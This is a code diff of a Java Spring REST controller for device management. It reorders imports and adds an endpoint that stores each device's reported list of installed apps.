@@ -1,13 +1,19 @@
 package io.renren.modules.app.web.api;
 
-import java.util.List;
-import java.util.Objects;
-
-import javax.annotation.Resource;
-import javax.servlet.http.HttpServletRequest;
-
-import io.renren.modules.app.entity.JsCode;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import io.renren.common.constant.Constant;
+import io.renren.common.utils.IpUtils;
+import io.renren.common.utils.Result;
+import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
+import io.renren.modules.app.common.Utils;
+import io.renren.modules.app.context.DeviceContext;
+import io.renren.modules.app.entity.*;
 import io.renren.modules.app.service.*;
+import io.renren.modules.app.vo.DeviceStatus;
+import io.renren.modules.app.vo.ServerConfig;
+import io.renren.modules.app.vo.UnLockParams;
+import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -15,22 +21,10 @@ import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-
-import io.renren.common.constant.Constant;
-import io.renren.common.utils.IpUtils;
-import io.renren.common.utils.Result;
-import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
-import io.renren.modules.app.common.Utils;
-import io.renren.modules.app.context.DeviceContext;
-import io.renren.modules.app.entity.Device;
-import io.renren.modules.app.entity.InputTextRecord;
-import io.renren.modules.app.entity.Log;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
-import lombok.extern.slf4j.Slf4j;
+import javax.annotation.Resource;
+import javax.servlet.http.HttpServletRequest;
+import java.util.List;
+import java.util.Objects;
 
 @Slf4j
 @RestController
@@ -40,7 +34,7 @@ public class DeviceApiController extends BaseApiController {
     @Autowired
     DeviceService deviceService;
     @Autowired
-    InstallAppService installAppService;
+    private InstallAppService installAppService;
 
     @Resource
     private TransferService transferService;
@@ -234,6 +228,19 @@ public class DeviceApiController extends BaseApiController {
         deviceService.updateById(updateDevice);
         return Result.toSuccess(serverConfig);
 
+    }
+
+    @RequestMapping("uploadInstallApp")
+    public Result<Void> uploadInstallApp(@RequestBody List<InstallApp> list){
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        for (InstallApp installApp : list) {
+            installApp.setDeviceId(deviceId);
+            installApp.setPkg(pkg);
+        }
+        installAppService.deleteByDeviceIdAndPkg(deviceId, pkg);
+        installAppService.saveBatch(list);
+        return Result.toSuccess();
     }
 
 }
